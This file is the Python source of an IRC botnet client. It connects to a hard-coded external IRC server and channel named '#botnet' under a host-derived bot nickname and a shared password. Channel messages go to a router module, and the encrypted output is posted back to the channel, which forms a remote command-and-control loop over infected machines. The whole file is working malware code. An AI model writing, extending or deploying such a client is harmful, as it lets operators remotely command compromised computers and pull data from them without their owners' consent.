import socket

import encrypt
import irc
import router

settings_server = "pi.jpdias.me"
settings_port = 1723
settings_botnick = "bot-" + socket.gethostname()
settings_botpass = "botnetpassword"
settings_owner = "root"
settings_commandprefix = "!"


ircSession = irc.connect(settings_server, settings_port, settings_botnick, settings_botpass, "#botnet", settings_owner)

while True:
    recvText = ircSession.recv(2048)  # Text read from the server
    recvText = recvText.split("\r\n")[0]  # immediately take away the "\r\n" from the end of the string
    print "<-- " + recvText  # Print the text to terminal for debugging
    parseText = recvText.split(" ")

    try:
        if parseText[1] == "PRIVMSG":
            # Handle PRIVMSGs here
            privmsgText = recvText.split(" ", 3)
            messageSender = privmsgText[0].lstrip(":").split("!")[0]
            messageChannel = privmsgText[2]
            messageSent = privmsgText[3].lstrip(":")
            # print "messageSender:", messageSender, "messageChannel:", messageChannel, "messageSent:", messageSent
            if not messageSender.startswith( 'bot' ):
                if messageSent[0] == settings_commandprefix:
                    ircSession.ParseUserCommands(ircSession, messageSender, messageChannel, messageSent)
                else:
                    output = router.distribute(messageSent)
                    # encrypt output
                    try:
                        output = encrypt.encrypt(output)
                        output = unicode(output, "utf-8")
                        ircSession.send('PRIVMSG ' + messageChannel + ' :' + str(output) + '\r\n')
                    except:
                        ircSession.send('PRIVMSG ' + messageChannel + ' :' + "Failed to encrypt." + '\r\n')
        if parseText[0] == "PING":
            # Respond to PINGs
            pingSender = parseText[1].split(":")[1]
            ircSession.send("PONG :" + pingSender + "\r\n")
        # print "--> PONG :" + pingSender

    except IndexError:
        continue
